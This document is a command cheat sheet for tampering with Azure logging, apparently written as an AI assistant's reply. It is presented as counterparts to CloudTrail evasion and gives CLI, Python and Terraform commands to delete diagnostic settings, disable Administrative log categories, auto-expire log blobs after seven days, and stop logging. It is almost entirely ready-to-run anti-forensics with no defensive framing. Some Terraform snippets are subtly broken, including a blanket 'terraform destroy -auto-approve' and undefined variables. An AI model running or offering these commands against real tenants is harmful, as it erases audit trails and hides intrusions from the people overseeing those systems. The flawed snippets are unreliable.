# Logging Tampering Techniques

## 1. Delete Diagnostic Settings (Similar to Deleting CloudTrail)

**CLI:**

az monitor diagnostic-settings delete --name \<diag_name\> --resource
\<resource_id\>

- --name \<diag_name\>: Name of the diagnostic setting (e.g.,
  activitylog-diagnostics)

- --resource \<resource_id\>: Resource ID of the Azure service (e.g., a
  storage account, VM, or subscription for Activity Log)

**Python (using Azure SDK):**

from azure.mgmt.monitor import MonitorManagementClient

from azure.identity import DefaultAzureCredential

client = MonitorManagementClient(DefaultAzureCredential(),
"\<subscription_id\>")

client.diagnostic_settings.delete(resource_uri="\<resource_id\>",
name="\<diag_name\>")

**Terraform:**

terraform init && terraform import
azurerm_monitor_diagnostic_setting.example
\<resource_id\>/providers/microsoft.insights/diagnosticSettings/\<diag_name\>

terraform destroy -auto-approve

**2. Disable Logging (Limit Log Categories / Event Types)**

**CLI:**

az monitor diagnostic-settings update --name \<diag_name\> --resource
\<resource_id\> --logs '\[{"category": "Administrative", "enabled":
false}\]'

- Limits logging to fewer categories (e.g., disables "Administrative"
  events)

**Python:**

from azure.mgmt.monitor import MonitorManagementClient

from azure.identity import DefaultAzureCredential

client = MonitorManagementClient(DefaultAzureCredential(),
"\<subscription_id\>")

client.diagnostic_settings.create_or_update(

resource_uri="\<resource_id\>",

name="\<diag_name\>",

parameters={

"logs": \[{"category": "Administrative", "enabled": False}\]

}

)

**Terraform:**

terraform init && terraform import
azurerm_monitor_diagnostic_setting.example
\<resource_id\>/providers/microsoft.insights/diagnosticSettings/\<diag_name\>

terraform apply -auto-approve -var 'log_categories=\["None"\]'

**3. Auto-Expire Logs (Equivalent of S3 Lifecycle)**

**CLI:**

az storage account management-policy create --account-name \<account\>
--policy @policy.json --resource-group \<rg\>

**policy.json** example to auto-delete blobs after 7 days:

{

"policy": {

"rules": \[

{

"name": "log-expire",

"enabled": true,

"type": "Lifecycle",

"definition": {

"filters": {

"blobTypes": \["blockBlob"\],

"prefixMatch": \[""\]

},

"actions": {

"baseBlob": {

"delete": {

"daysAfterModificationGreaterThan": 7

}

}

}

}

}

\]

}

}

**Python:**

from azure.mgmt.storage import StorageManagementClient

from azure.identity import DefaultAzureCredential

policy = {

"rules": \[

{

"enabled": True,

"name": "log-expire",

"type": "Lifecycle",

"definition": {

"filters": {

"blobTypes": \["blockBlob"\],

"prefixMatch": \[""\]

},

"actions": {

"baseBlob": {

"delete": {

"daysAfterModificationGreaterThan": 7

}

}

}

}

}

\]

}

client = StorageManagementClient(DefaultAzureCredential(),
"\<subscription_id\>")

client.management_policies.create_or_update(

"\<resource_group\>", "\<account_name\>", {

"policy": policy

}

)

**Terraform:**

resource "azurerm_storage_management_policy" "log_policy" {

storage_account_id = azurerm_storage_account.logs.id

rule {

name = "expire-logs"

enabled = true

filters {

prefix_match = \[""\]

blob_types = \["blockBlob"\]

}

actions {

base_blob {

delete {

days_after_modification_greater_than = 7

}

}

}

}

}

**4. Stop Logging (Equivalent to cloudtrail stop-logging)**

In Azure, logging is typically controlled by removing diagnostic
settings from the subscription or resource. No dedicated “pause logging”
exists.

**CLI Alternative:**

az monitor diagnostic-settings delete --name \<diag_name\> --resource
\<resource_id\>

**Python:**

client.diagnostic_settings.delete(resource_uri="\<resource_id\>",
name="\<diag_name\>")

**Terraform:**

terraform init && terraform import
azurerm_monitor_diagnostic_setting.example
\<resource_id\>/providers/microsoft.insights/diagnosticSettings/\<diag_name\>

terraform apply -auto-approve -var 'enabled=false'

Would you like this turned into a Markdown cheatsheet
